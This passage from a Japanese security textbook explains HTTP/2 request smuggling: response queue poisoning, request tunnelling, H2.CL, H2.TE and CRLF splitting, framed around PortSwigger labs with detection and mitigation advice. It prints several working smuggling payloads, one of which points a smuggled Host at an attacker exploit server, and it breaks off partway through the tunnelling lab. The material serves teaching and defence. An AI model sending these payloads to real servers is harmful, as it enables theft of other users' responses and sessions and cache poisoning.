# 第5章 発展的スマグリング技法

## Advanced request smuggling トピック（response queue poisoning / request tunnelling）

この節では、HTTPリクエストスマグリング（HTTP request smuggling: 複数のサーバが1本のTCP接続を流れるHTTPメッセージの「どこまでが1リクエストか」という境界の解釈をずらすことで、後続のリクエストに攻撃者のデータを混入させる攻撃）の**発展的トピック**を扱う。とりわけ次の2つの技法を仕組みレベルで掘り下げる。

- **Response queue poisoning（レスポンスキュー汚染）**: フロントエンドが「どのバックエンド応答をどのクライアントに返すか」の対応をずらし、他ユーザの応答を丸ごと盗み取る、非常に破壊的な攻撃。
- **HTTP request tunnelling（リクエストトンネリング）**: フロントエンドとバックエンド間の接続が**他ユーザと共有されない**（＝古典的スマグリングが成立しない）環境でも、自分自身の接続の中に「隠しリクエスト」を通してしまう技法。

これらに入る前に、まず親ページ「Advanced request smuggling」が俯瞰する発展トピック全体の地図を押さえる。読者は古典的なCL.TE / TE.CL / TE.TE（Content-Length と Transfer-Encoding の解釈差を突く基本形）は既知である前提で進める。

> ⚠️ **スコープ注記**: 本節は防御・検知の理解を目的とする。実在サービスや本番環境への無許可の検証、破壊的な手順の実行は行わないこと。ペイロード例はいずれも自分が管理する検証用ラボ（例: PortSwigger Web Security Academy）でのみ試すこと。

### 発展トピックの全体像（親ページの地図）

PortSwiggerの「Advanced request smuggling」ページは、古典的なCL/TEベースの攻撃の先にある技法群を整理している。核心は、**HTTP/2 downgrading（HTTP/2ダウングレード）** という運用形態が新しいスマグリング面を作り出す、という点にある。

#### HTTP/2 ダウングレードとは何か、なぜ危ないのか

HTTP/2はメッセージ長を**フレームの明示的な長さフィールド**という単一かつ堅牢な仕組みで表現する。したがって理論上、HTTP/2をエンドツーエンド（front-endからback-endまで全区間）で使えば「長さの解釈差」というスマグリングの根本原因は消える。

ところが現実には、フロントエンド（リバースプロキシ/CDN/ロードバランサ）が受け取ったHTTP/2リクエストを、バックエンドへ転送する際に**HTTP/1.1の構文へ書き戻す（rewrite/downgrade）** 構成が非常に多い。この「HTTP/2 → HTTP/1.1」変換の過程で、HTTP/2では無害だった要素がHTTP/1.1の長さ指定（Content-Length や Transfer-Encoding）に化けることがあり、そこに新しい曖昧性＝スマグリング面が生まれる。親ページが挙げる主な発展トピックは以下の通り。

| トピック | 一言でいうと | 何を突くか |
|---|---|---|
| **H2.CL** | HTTP/2リクエスト内の `content-length` を検証せずダウングレード | フロントは暗黙のHTTP/2フレーム長、バックは注入された `Content-Length` を信じてズレる |
| **H2.TE** | HTTP/2で禁止のはずの `transfer-encoding: chunked` を剥がさずダウングレード | ダウングレード後のバックがchunkedを解釈し境界がズレる |
| **HTTP/2 CRLF インジェクション** | ヘッダ値内の `\r\n` がダウングレード後に区切りとして再解釈される | バイナリなHTTP/2では `\r\n` は単なるデータだが、HTTP/1化で区切りに化ける |
| **HTTP/2 request splitting** | ボディではなく**ヘッダ部**に分割点を作る | GET等でも1本を2本に割れる |
| **Response queue poisoning** | 応答キューの対応をずらしサイト全体を乗っ取る | 本節の主題（後述） |
| **HTTP request tunnelling** | 接続を再利用しない環境でも自分の接続内に隠しリクエストを通す | 本節の主題（後述） |
| **CL.0 / 0.CL** | 一方が `Content-Length` を無視、他方が処理する | ブラウザ起点のクライアントサイドdesyncにも波及 |
| **Client-side / pause-based desync** | ブラウザとサーバの接続処理の差を突く | 被害者ブラウザを起点に内部インフラへ攻撃 |

これらの多くは、Director of ResearchのJames Kettle氏がBlack Hat USA 2021で発表した研究（および続く一連のホワイトペーパー、最近では「HTTP/1.1 Must Die」）に由来する。

##### 「隠れたHTTP/2サポート」に注意

一部のサーバは、ALPN（Application-Layer Protocol Negotiation: TLSハンドシェイク中にプロトコルを合意する仕組み）でHTTP/2を広告していないのに、実際にはHTTP/2で話せてしまう**誤設定**を抱えている。Burp Suiteの「Allow HTTP/2 ALPN override」設定を使うと、ALPNの合意結果を無視して強制的にHTTP/2で接続し、こうした隠れサポートを炙り出せる（Burp Scannerは自動検知する）。防御側の観点では、「HTTP/2で話せるつもりがない」サーバでも実は話せてしまう可能性を前提に、明示的に無効化・検証しておくことが重要だ。

### Response queue poisoning（レスポンスキュー汚染）

#### 定義とインパクト

Response queue poisoningは、「フロントエンドサーバがバックエンドからの応答を**間違ったリクエストに対応づけ始める**」状態を引き起こす、非常に強力なスマグリング攻撃である。成功すると、他ユーザ宛ての応答を丸ごと自分が受け取れるようになり、原典は影響を「通常は壊滅的（catastrophic）」と表現している。攻撃者は次を達成しうる。

- 他ユーザの応答を**継続的に**盗み取る（一度汚染すると持続する）。
- 応答に含まれる**セッショントークンや個人・業務データ**へアクセスし、**アカウント乗っ取り**に至る。
- 正規ユーザには「他人の応答」が返るため機能が壊れ、**巻き添え被害**が広がる。

#### なぜ「応答キュー」がズレるのか — 仕組み

キモは、HTTP/1.1のコネクションが**リクエストとレスポンスの厳密な順序（FIFO）** に依存している点にある。フロントエンドとバックエンドが1本のTCP接続を使い回すとき、両者は暗黙のうちに「n番目に送ったリクエストの応答が、n番目に返ってくる」と信じている。この順序対応が崩れると、応答が1つずつ後ろへズレる。

Response queue poisoningが成立するには、次の**3条件**すべてが必要だ。

1. **接続の再利用**: フロントエンドとバックエンド間のTCP接続が、複数のリクエスト/レスポンスのサイクルで使い回される。
2. **完全なリクエストのスマグリング**: 「部分的な」断片ではなく、**それ自身が独立した応答を受け取れる完全なリクエスト**を丸ごと密輸できる。
3. **接続が閉じない**: 攻撃によってどちらのサーバもTCP接続を閉じてしまわない（閉じるとキューがリセットされ持続しない）。

#### 攻撃の流れ（3ステップ）

##### ステップ1: 完全なリクエストを1つ余分に密輸する

古典的スマグリングでは「不完全な断片」を残して次の犠牲者のリクエストにくっつけるが、Response queue poisoningでは**完結した1リクエストを丸ごと**密輸する。つまり、攻撃者は1回の送信で**バックエンドに2リクエストを届ける**。原典のCL.TE例は次の通り。

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Type: x-www-form-urlencoded
Content-Length: 61
Transfer-Encoding: chunked

0

GET /anything HTTP/1.1
Host: vulnerable-website.com


```

**なぜこうなるのか（パーサの挙動）**:

- フロントエンドが `Content-Length: 61` を採用する場合、ボディは「`0\r\n\r\nGET /anything HTTP/1.1\r\nHost: vulnerable-website.com\r\n\r\n`」の61バイトぶんまでが1リクエストのボディだと解釈し、**全体を1リクエスト**としてバックエンドへ転送する。
- 一方バックエンドが `Transfer-Encoding: chunked` を採用する場合、chunkedの終端は**サイズ0のチャンク（`0\r\n\r\n`）** で示される。したがってバックエンドは最初のPOSTを「ボディ長0の完結したリクエスト」と見なし、**そこで1本目を打ち切る**。残った `GET /anything ...` を**まったく新しい2本目のリクエスト**として解釈する。

結果、フロントは「1リクエスト送った」と思っているのに、バックは「2リクエスト受け取った」と認識する。この非対称が全ての起点だ。

##### ステップ2: 応答キューがズレる

バックエンドは受け取った2リクエストに対し、**2つの応答**を返す。ところがフロントエンドは「1リクエストしか送っていない」ので、返ってきた最初の応答（POST `/` の応答）だけをそのクライアントに返し、**2つ目の応答（GET `/anything` の応答）は接続上のキューに置き去りにされる**。

##### ステップ3: キュー汚染が持続する

ここで**別のユーザ（あるいは別のリクエスト）** が同じ再利用接続を通ると、フロントは新しいリクエストを普通にバックへ転送する。しかし応答を返す番になると、フロントはキューの**先頭に残っていた「密輸リクエストへの応答」を先に返してしまう**。以後、応答は全て1つずつ後ろへズレ続ける。

```
（正常時）
 ユーザA req  →  応答A
 ユーザB req  →  応答B

（汚染後：キューが1つズレている）
 ユーザA req  →  [密輸GET /anything の応答]   ← 攻撃者が仕込んだ余りが先頭に居座る
 ユーザB req  →  応答A                          ← Aの応答（セッショントークン等）がBに届く
 ...          →  応答B                          ← 以降ずっと1個ずつズレる
```

このズレは接続が閉じない限り**持続的**であり、攻撃者が follow-up リクエストを送るたびに「1つ前のリクエスト＝**他人のリクエスト**」の応答が返ってくる。これがキュー汚染（poisoning）である。

#### 悪用（応答の刈り取り）

汚染が成立した後、攻撃者は任意のリクエストを送り続けるだけで、返ってくる応答（＝直前に処理された他ユーザの応答）を収集できる。応答は順番にキューされるため、Burp Intruderのようなツールで自動化すれば**複数ユーザの応答を次々に刈り取れる**。

> **原典のTip**: 攻撃側の2つのリクエストとも**存在しないパス**を指定しておくとよい。自分のリクエストには必ず404が返るはずなので、「404 = 自分の応答」「それ以外の中身のある応答 = 盗んだ他人の応答」と**確実に区別**できる。

#### 検知・成立条件のまとめ

Response queue poisoningは「古典的なHTTP/1リクエストスマグリング」でも、「HTTP/2ダウングレードの悪用」でも成立しうる。防御・検知の観点では次が重要だ。

- **接続再利用の可視化**: フロント〜バック間でコネクションを共有・再利用しているかを構成上把握する。共有接続はキュー汚染の前提条件。
- **応答の取り違えを疑うシグナル**: ユーザに「別人の応答」が返る、ログイン済みなのに別アカウントの画面が出る、といった報告は本攻撃の兆候になりうる。
- **根本対策**: 後述の一般防御（HTTP/2エンドツーエンド化、長さ解釈の一貫化、曖昧なリクエストの拒否）に加え、**曖昧・不正なリクエストを検知したら接続を閉じる**（キューを持続させない）ことが有効。

### HTTP request tunnelling（HTTPリクエストトンネリング）

#### 定義 — 古典的スマグリングとの決定的な違い

HTTP request tunnellingは、**1つのリクエストを送って、バックエンドから2つの応答を引き出す**技法である。古典的スマグリングが「接続を汚染して**他ユーザ**のソケットに攻撃を混ぜ込む」ことを狙うのに対し、tunnellingの本質は、

> **「リクエストとその対応する応答を、フロントエンドから完全に隠す」**

ことにある。つまり他ユーザのトラフィックには必ずしも影響しないが、**自分自身の接続の中に「フロントに見えない隠しリクエスト」を通す**。これにより、次のような環境でも高深刻度の攻撃が成立しうる点が重要だ。

- サーバが**IPアドレス単位やクライアント単位で接続再利用を厳格に制限**している。
- つまり「接続再利用で他ユーザに攻撃を届ける」経路が塞がれている。

古典的スマグリングが無力化される、まさにこうした環境でこそtunnellingの価値が出る。成立の根本原因は共通で、**フロントエンドが応答を読み取る方法と、バックエンドがリクエストを解釈する方法がズレている**ことだ。

#### 内部ヘッダを漏洩させる（HTTP/2 CRLFインジェクションの応用）

代表的な悪用は、HTTP/2ダウングレードを利用してヘッダ値に**CRLF（`\r\n`）** を注入し、バックエンドがそれを「ヘッダの区切り／終端」と再解釈してしまう性質を突くものだ。原典の例（HTTP/2のフレーム表現）:

```
:method     POST
:path       /comment
:authority  vulnerable-website.com
content-type    application/x-www-form-urlencoded
foo             bar\r\n
                Content-Length: 200\r\n
                \r\n
                comment=
```

**なぜ内部ヘッダが漏れるのか**:

- HTTP/2はバイナリ形式なので、ヘッダ値 `foo` の中にある `\r\n` は**ただのデータ**として無害に運ばれる。
- ところがフロントエンドがこれをHTTP/1.1へダウングレードすると、`foo: bar\r\nContent-Length: 200\r\n\r\ncomment=` という**平文**が生成される。
- バックエンド（HTTP/1.1パーサ）はこの `\r\n\r\n` を**ヘッダ部の終端**と解釈し、以降を**ボディ**とみなす。さらにこのリクエストは末尾が `comment=` で終わる不完全な形になるため、バックエンドは「ボディの続き」を待つ。
- そこへ、フロントが同じ接続で転送してきた**後続の内部リクエスト（フロントが付与する内部ヘッダ入り）** がくっつき、`comment=` パラメータの**値として**取り込まれる。結果、`comment` フィールドに**フロントエンドが付けている内部ヘッダ**（例: 内部認証ヘッダ、実クライアントIP、ルーティング情報など）がまるごと反映され、攻撃者に漏れる。

つまり「本来フロント〜バック間だけで使われる秘密のヘッダ」を、アプリの出力（コメント表示など）経由で読み出せてしまう。

#### Blind（盲目的）と Non-blind の違い

##### なぜ「盲目的」になるのか

**Blind tunnelling**: 多くのフロントエンドは、応答を読む際に `Content-Length` で指定されたバイト数**だけ**を読み、1つ目の応答を返したら読み取りを止める。したがって、トンネルした2つ目の応答は**フロントが読まずに捨てる**ため、攻撃者には**見えない**。中身が返ってこないので盲目的（blind）になる。

##### Non-blind 化するには — フロントに「読み過ぎ」させる

**Non-blind tunnelling**: フロントエンドを**意図的に応答を読み過ぎ（over-read）させる**ことで、2つ目のトンネル応答を1つ目の応答の中に取り込ませ、可視化する。代表的手口が**HEADリクエストの悪用**だ。

- HEADリクエストへの応答は、**ボディを持たない**のに `Content-Length` ヘッダを（本来GETしたときのボディ長として）含むことが多い。
- この `Content-Length` を利用して、フロントに「実際には存在しないボディ（＝実体はトンネルした2つ目の応答のバイト列）」まで読ませることができる。フロントは指定バイト数を満たそうとして**バックの次の応答まで読み込み**、それを1つ目の応答ボディとして攻撃者に返す。

長さの辻褄合わせは**試行錯誤**になる。原典によれば、エンドポイントを変える／パディング（詰め物）を注入する／トンネルするリクエストの長さを調整する、といった方法で「フロントが期待する長さ」に合わせ込む。

#### HTTP/2 は検知を容易にする

HTTP/1環境では、「曖昧な応答が返った」だけではスマグリング成立の確証を得にくい（正常な揺らぎと区別しづらい）。一方HTTP/2では、仕様上**1つの「ストリーム」には1リクエスト＋1レスポンスしか入らない**はずである。したがって、**HTTP/2応答のボディの中にHTTP/1形式の応答（`HTTP/1.1 200 OK ...`）が丸ごと埋め込まれて返ってきたら**、それはトンネリング成功の**強い証拠**になる。ストリーム分離という設計が、皮肉にも検知シグナルを明瞭にする。

#### Web キャッシュ汚染への波及

トンネルした応答は、**それを包む外側の応答からヘッダを継承**しうる。例えば、本来 `Content-Type: application/json` で返るべきAPI応答（エスケープされていない `<script>` タグを含む）が、外側のHTML応答のボディに**入れ子**で取り込まれると、ブラウザ上で**HTMLとして解釈されスクリプトが実行**されうる。この汚染された応答がキャッシュされれば、**後続の全ユーザ**に配信され、持続的なXSS/キャッシュ汚染となる。

#### 検知の難しさ（まとめ）

- **HTTP/1**: ambiguous（曖昧）な応答だけではスマグリングを確定できず、検知が難しい。
- **HTTP/2**: ストリーム分離により、埋め込まれたHTTP/1応答という明確なシグナルが得られ、検知しやすい。

防御の観点では、tunnellingは**接続再利用を制限しても防げない**点が要注意だ。「接続をユーザ単位に分離したから安全」という思い込みは成り立たない。根本原因である**長さ解釈のズレとダウングレード時の再解釈**を断つ必要がある。

### 両技法に共通する防御策

Response queue poisoning と request tunnelling は表出こそ違うが、根は同じ「メッセージ境界／長さ解釈のズレ」にある。防御は次の多層で行う。

1. **HTTP/2 をエンドツーエンドで使う（ダウングレードしない）**
   フロント〜バック全区間でHTTP/2を維持すれば、HTTP/1化に伴う `Content-Length`/`Transfer-Encoding`/CRLF再解釈という曖昧性そのものが消える。最も根本的な対策。

2. **ダウングレード時の厳格な検証**
   やむを得ずダウングレードするなら、HTTP/2のフレーム長と `content-length` の**一致を厳格に検証**し、齟齬があれば拒否する。HTTP/2で**禁止のヘッダ（`transfer-encoding` 等）を必ず剥がす／拒否**する。ヘッダ値内の `\r\n` などの不正文字を**正規化・拒否**する（CRLFインジェクション対策）。

3. **チェーン全体で長さ解釈を一貫させる**
   経路上の全サーバが「リクエスト長を同じ規則で解釈」するようそろえる。CLとTEが同時に来たら曖昧として**一律拒否**するのが安全側。

4. **曖昧なリクエストを検知したら接続を閉じる**
   不正・曖昧なメッセージを受けたら該当TCP接続を破棄し、キューを持続させない。これはresponse queue poisoningの「持続性」を断ち切るうえで特に有効。

5. **接続再利用の設計を見直す（ただし過信しない）**
   可能なら接続再利用を避ける／限定するのは有効だが、**tunnellingは接続再利用を制限しても成立しうる**ため、これ単独を対策にしてはならない。

6. **隠れHTTP/2サポートの棚卸し**
   ALPNで広告していなくてもHTTP/2で話せてしまう誤設定を洗い出し、意図しないHTTP/2受け口を塞ぐ。

### この節の要点

- **Response queue poisoning** は「完結した1リクエストを余分に密輸」→「フロントの応答キューが1つズレる」→「以後、他ユーザの応答が自分に届き続ける」という持続的・壊滅的な攻撃。成立条件は「接続再利用」「完全なリクエストの密輸」「接続が閉じないこと」の3つ。存在しないパスを使うと自分の応答（404）と盗んだ応答を確実に区別できる。
- **HTTP request tunnelling** は「1リクエストで2応答」を引き出し、**フロントから隠したリクエスト/応答を自分の接続内に通す**技法。接続再利用が厳格に制限された環境でも成立する点が古典的スマグリングと決定的に異なる。HEADによる over-read で blind → non-blind 化でき、内部ヘッダ漏洩やキャッシュ汚染に発展する。HTTP/2はストリーム分離ゆえ**検知が容易**（埋め込まれたHTTP/1応答が動かぬ証拠）。
- 両者の根本原因は共通で、**HTTP/2ダウングレード時の長さ・区切りの再解釈**。防御は**HTTP/2エンドツーエンド化**を筆頭に、ダウングレード時の厳格検証、長さ解釈の一貫化、曖昧リクエスト時の接続クローズを多層で講じる。

## HTTP/2 発展ラボ（RQP / request splitting / H2.CL / tunnelling WCP）

このセクションでは、HTTP/2 特有のリクエストスマグリング（HTTP request smuggling、複数サーバ間でリクエスト境界の解釈がずれることを悪用する攻撃）を、4 つの発展的な技法に沿って**仕組みレベルで**解説する。いずれも PortSwigger の Web Security Academy ラボが題材だが、本書は**防御目的**の教科書であり、実在サービスや本番環境への無許可検証、他利用者のセッション奪取・データ削除といった破壊的手順は記述しない。攻撃者がなぜ成功できるのか、その原理と検知・緩和策の理解に焦点を当てる。ペイロード例は「なぜその構造が境界のズレを生むのか」を説明するための最小限の材料として引用する。

> ⚠️ スコープ注記: 本セクションのペイロード例は、あくまで自分が管理する学習環境（PortSwigger のラボなど、明示的に許可されたサンドボックス）でのみ再現してよい。第三者のサービスに向けて送信してはならない。

### 前提：なぜ HTTP/2 ダウングレードが危険なのか

これら 4 技法に共通する土台は「**HTTP/2 → HTTP/1.1 ダウングレード**」である。まずここを押さえないと、個々のラボは理解できない。

HTTP/1.1 では、リクエストの各行は `\r\n`（キャリッジリターン＋ラインフィード、いわゆる CRLF）というテキスト上の区切り文字で分けられ、ヘッダの終端は空行（`\r\n\r\n`）で示される。ボディの長さは `Content-Length`（バイト数を明示）か `Transfer-Encoding: chunked`（チャンク列で表現）というヘッダで**間接的に**決まる。つまり「どこでリクエストが終わるか」は本文中のテキストに依存する。

一方 HTTP/2 は**バイナリフレーミング**を採用する。ヘッダは HEADERS フレーム、ボディは DATA フレームという独立したフレームに分けて運ばれ、各フレームは自身の長さフィールドを持つ。ストリームの終わりは `END_STREAM` フラグで明示される。したがって HTTP/2 では「リクエストの長さ」は**プロトコル層で厳密に（implicit に）決まる**。`Content-Length` や `Transfer-Encoding` は原則不要であり、HTTP/2 の仕様（RFC 9113）は矛盾するメッセージを不正として拒否することを求めている。

問題は、多くのフロントエンド（リバースプロキシ、CDN、ロードバランサ）が、受け取った HTTP/2 リクエストを**内部のバックエンドへは HTTP/1.1 に「翻訳（ダウングレード）」して転送する**点にある。この翻訳が不完全だと、次の破綻が起きる。

- **長さの二重表現**: フロントエンドが、利用者が送り込んだ `content-length` や `transfer-encoding` ヘッダをそのまま HTTP/1.1 リクエストに書き写してしまう。すると HTTP/2 のフレーム長（フロントエンドが認識した本当の長さ）と、HTTP/1.1 ヘッダ（バックエンドが信じる長さ）が食い違う。→ **H2.CL / H2.TE** の温床。
- **CRLF の非無害化**: HTTP/2 のヘッダ値やパス（`:path` 擬似ヘッダ）は本来バイナリフィールドなので `\r\n` が「ただのバイト列」として通る。フロントエンドがこれを無害化せず HTTP/1.1 テキストに展開すると、`\r\n` が**行区切りとして復活**し、1 つのリクエストが複数に割れる。→ **request splitting / request tunnelling** の温床。

要するにダウングレードとは「厳密な長さ表現（フレーム）を、あいまいな長さ表現（テキスト＋CL/TE）に落とす」変換であり、そこに利用者制御のデータが混ざると境界が破綻する。以下の 4 技法はこの破綻の異なる現れ方である。

> 出典: HTTP/2 request smuggling — https://portswigger.net/web-security/request-smuggling/advanced

### ラボ1：H2.TE response queue poisoning

#### 何が起きているか

このラボが示すのは「**H2.TE**」、すなわち HTTP/2 リクエストに `Transfer-Encoding: chunked` を注入し、ダウングレード後の HTTP/1.1 でチャンクエンコーディングとして解釈させるパターンである。フロントエンドは「あいまいな長さを持つ HTTP/2 リクエストであってもそのままダウングレードする」実装になっており、これが弱点になる。

問題を示す最小構造は次の通り（`\r\n` はここでは説明用の空行として表現）。

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0
SMUGGLED
```

- HTTP/2 のフレーム層では、フロントエンドはボディ全体（`0\r\nSMUGGLED\r\n...`）を 1 リクエストのボディとして正しく受け取り、その長さを認識している。
- ところがダウングレード時、フロントエンドは利用者が付けた `transfer-encoding: chunked` を HTTP/1.1 ヘッダに書き写す。バックエンドはこれをチャンク本体として読み、**`0` を「チャンク列の終端」**と解釈する。
- するとバックエンドにとってリクエストは `0\r\n\r\n` で終わり、続く `SMUGGLED` 以降は「**接続に残った次のリクエストの先頭**」として扱われる。ここに境界のズレ（desync）が生じる。

#### response queue poisoning とは何か

古典的なスマグリングは「後続の**別利用者のリクエストの先頭**に自分のプレフィックスを連結する（CL.TE 等）」形が多い。それに対し **response queue poisoning（応答キュー汚染、RQP）** は、境界のズレによって「**リクエストと応答の対応関係（キュー）を丸ごと 1 つずらす**」攻撃である。

HTTP/1.1 のキープアライブ接続では、フロントエンドは送ったリクエストの順にバックエンドの応答を受け取ることを前提にしている。攻撃者が「完全な密輸リクエスト」を 1 本余分に注入すると、バックエンドは応答を 1 本多く返す。以後、フロントエンドが受け取る応答は**すべて 1 つ手前にズレる**。結果として、フロントエンドは利用者 A に対して「A の 1 つ前のリクエスト（＝別の利用者 B のリクエスト）に対する応答」を返してしまう。

完全な密輸リクエストの形は次のように、ヘッダ終端 `\r\n\r\n` まで自己完結させる点が肝心である。

```
POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0
GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

```

- `0` でチャンク終端 → バックエンドは POST を完了扱い。
- 続く `GET /x HTTP/1.1 ... \r\n\r\n` は独立した完全なリクエストとしてキューに積まれる。これで応答が 1 本余分に生成され、キューが 1 つずれる。

#### なぜ「情報漏えい」につながるのか（原理のみ）

キューがずれた状態では、フロントエンドが正規利用者に返す応答が「別の利用者宛ての応答」になる。攻撃者が繰り返し空リクエストを送れば、**別利用者に返るはずだった応答（例えばログイン直後の 302 応答や、それに含まれるセッション情報）を自分が受け取ってしまう**。これがセッション乗っ取り・権限昇格の起点になる。教科書としては「境界のズレが応答の宛先を丸ごと入れ替える」という原理の理解が本質であり、具体的な被害者データの奪取手順は本書では扱わない。

#### 検知・防御

- フロントエンドは、HTTP/2 リクエストに含まれる `transfer-encoding` / `content-length` を**無視・除去**し、ダウングレード時は自身が認識した実長から `Content-Length` を再計算して付与する（利用者値を書き写さない）。
- あいまいな長さを持つ HTTP/2 リクエストは RFC 9113 に従い**拒否**する。
- 可能なら**バックエンドへも HTTP/2 で接続**し、ダウングレード自体をなくす（HTTP/2 end-to-end）。
- 接続の使い回しを避ける、または desync 検知時に接続を破棄する。ラボは「10 リクエストごとに接続をリセット」する挙動を持ち、これは現実の緩和策（接続寿命の制限）に対応する。

### ラボ2：H2 request splitting via CRLF injection

#### 何が起きているか

こちらは長さヘッダ（CL/TE）ではなく、**ヘッダ値への CRLF 注入**でリクエストを 2 つに割る（splitting）技法である。前述のとおり HTTP/2 のヘッダ値はバイナリなので `\r\n` を含められる。フロントエンドがこれを無害化せずにダウングレードすると、`\r\n` が HTTP/1.1 の行区切りとして復活し、1 本のリクエストが複数に分裂する。

技法を示すヘッダは次の構造を持つ（Burp の Inspector などで値中に生の改行を挿入する）。

- ヘッダ名: `foo`
- ヘッダ値:
```
bar\r\n
\r\n
GET /x HTTP/1.1\r\n
Host: YOUR-LAB-ID.web-security-academy.net
```

ダウングレード後、バックエンドにはこう見える。

```
foo: bar

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

[元のリクエストの残り]
```

#### なぜ割れるのか

- `bar\r\n` の時点で `foo` ヘッダ行が終わる。
- 続く ` \r\n`（先頭に**スペースを 1 個**置いた空行相当）が、元のヘッダブロックを終端させる空行として働く。ここで**1 本目のリクエストのヘッダが閉じる**。
- その直後の `GET /x HTTP/1.1 ...` は、バックエンドにとって**独立した 2 本目のリクエストのリクエストライン**になる。こうして 1 本の HTTP/2 リクエストが、HTTP/1.1 では 2 本に分裂する。
- 分裂した 2 本目が余分な応答を生むため、結果として**ラボ1と同じ応答キューのズレ（RQP）**が起きる。splitting は「CRLF 注入で密輸プレフィックスを作る手段」であり、その帰結は応答キュー汚染という点で共通する。

#### なぜ「スペース 1 個」が重要か

空行の前に置いたスペースは、密輸したリクエストラインが**不正なヘッダ行として拒否されるのを避ける**ための調整である。HTTP/1.1 パーサによっては、ヘッダブロックの直後に来る行を厳密に検証する。適切な空白・改行の並びにすることで、注入したテキストがパーサに「正当な区切り＋新しいリクエスト」として受理される。ここは実装ごとに要求される整形が微妙に異なるため、**パーサの寛容さ（あるいは差異）に依存する**という点を理解しておくとよい。

#### 検知・防御

- フロントエンドは HTTP/2 の**ヘッダ名・ヘッダ値に含まれる `\r`・`\n` を検出したら拒否**する（RFC 9113 は制御文字を含むフィールドを不正とする）。
- ダウングレード時にヘッダ値をエスケープ／サニタイズしてから HTTP/1.1 テキストに展開する。
- ラボは「10 リクエストごとの接続リセット」を持つ。desync 状態の巻き戻しに使われるが、現実でも接続再利用を絞ることが緩和になる。

> 出典: Lab: HTTP/2 request splitting via CRLF injection — https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection

### ラボ3：H2.CL request smuggling

#### 何が起きているか

「**H2.CL**」は、HTTP/2 リクエストに**明示的な `Content-Length` ヘッダ**を注入し、それが HTTP/2 の暗黙の（フレームで決まる）長さと矛盾することを悪用する。ラボのフロントエンドは「あいまいな長さの HTTP/2 リクエストでもそのままダウングレードする」ため成立する。

問題を示す最小構造。

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

SMUGGLED
```

- HTTP/2 のフレーム層では、フロントエンドは `SMUGGLED` を含む DATA フレームを 1 リクエストのボディとして正しく認識している（本当の長さを知っている）。
- しかしダウングレード時、フロントエンドは利用者が付けた `content-length: 0` をそのまま HTTP/1.1 に書き写す。バックエンドは「ボディ長 0」と信じるため、`POST /` は空ボディで完了とみなす。
- すると `SMUGGLED` 以降はボディの外、つまり「**次のリクエストの先頭**」として接続に残る。これが密輸プレフィックスになる。

H2.TE との違いは「長さのあいまいさをチャンク終端で作るか（TE）、CL:0 の嘘で作るか（CL）」であり、**帰結（後続リクエストへのプレフィックス連結）は同型**である。

#### 悪用の方向性（原理のみ）

密輸プレフィックスに完全なリクエストを仕込むと、後続の別利用者のリクエストと連結され、たとえば別利用者を攻撃者の用意した URL へ誘導する（`Host` を差し替えたリクエストを密輸し、被害者ブラウザに悪性リソースを読み込ませる等）ことが原理的に可能になる。ラボのペイロード例は次の形をとる。

```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Length: 5

x=1
```

- `Content-Length: 0` により、`GET /resources ...` 以降が独立したリクエストとして解釈される。
- 密輸リクエストの `Host` を攻撃者サーバに向けることで、後続利用者のリソース取得を攻撃者制御下に引き込む発想である。
- 末尾の `Content-Length: 5` と `x=1` は、密輸リクエストの後ろに連結される「次の本物のリクエスト」を吸収し、パースを安定させるためのパディング調整。

本書では防御学習が目的のため、被害者を誘導して JavaScript を実行させるといった実行手順そのものは扱わず、「CL の嘘が後続リクエストの制御を奪う」という原理の理解にとどめる。

#### 検知・防御

- フロントエンドは HTTP/2 リクエストに含まれる**明示的な `Content-Length` を拒否または除去**する。HTTP/2 では CL は本来不要であり、存在すれば疑うべき。
- ダウングレード時は、フロントエンドが**フレームから実測した長さ**で `Content-Length` を再計算して付与する。
- 長さの整合性（フレーム長 = CL）をダウングレード前に検証し、矛盾すれば拒否する。

> 出典: Lab: H2.CL request smuggling — https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling

### ラボ4：H2 web cache poisoning via request tunnelling

#### request tunnelling（リクエストトンネリング）とは

これまでの 3 技法は「**フロントエンドがバックエンドへの接続を使い回す**」ことを前提にしていた。使い回すからこそ、密輸したプレフィックスが「次の利用者のリクエスト」と連結できた。

ところが**フロントエンドが接続を使い回さない**（リクエストごとに新しいバックエンド接続を張る、あるいは 1 接続 1 リクエストに限定する）場合、古典的スマグリングは成立しない。別利用者のリクエストと連結する機会がないからだ。

そこで登場するのが **request tunnelling（リクエストトンネリング）** である。これは「他利用者を巻き込む」のではなく、「**自分の 1 本の HTTP/2 リクエストの中に、複数の HTTP/1.1 リクエストを畳み込んで、同じバックエンド接続の中で処理させる**」技法である。ダウングレード時の CRLF 非無害化を使い、自分のリクエスト内部に第 2 のリクエストを「トンネル」する。他利用者の接続に干渉しないため、接続非再利用の環境でも成立する。

#### blind と non-blind の違い

- **non-blind tunnelling**: トンネルした第 2 リクエストの**応答を自分で観測できる**。フロントエンドがバックエンドの応答をすべて（あるいは複数）返してくれる状況。攻撃者はキャッシュ汚染前に「トンネルが効いているか」「どんな応答が返るか」を確認できる。
- **blind tunnelling**: 第 2 リクエストの応答が返らず、**結果を直接観測できない**。効いているかは間接的（時間差やキャッシュ後の挙動）にしか分からない。

このラボは **HEAD メソッドを使った non-blind tunnelling** を扱う。HEAD 応答にはボディが無いがヘッダ（特に `Content-Length`）が付くため、フロントエンドが「本文をこの長さだけ読む」と誤認し、後続のトンネル応答をボディとして読み出せる。これが応答観測を可能にする鍵になる。

#### `:path` 擬似ヘッダへの CRLF 注入

トンネリングの注入点はヘッダ値ではなく、HTTP/2 の **`:path` 擬似ヘッダ**（リクエスト対象のパスを表すバイナリフィールド）である。ここに `\r\n` を注入する。

まず注入が効くかを示す最小形（`:path` の値）。

```
/?cachebuster=1 HTTP/1.1\r\n
Foo: bar
```

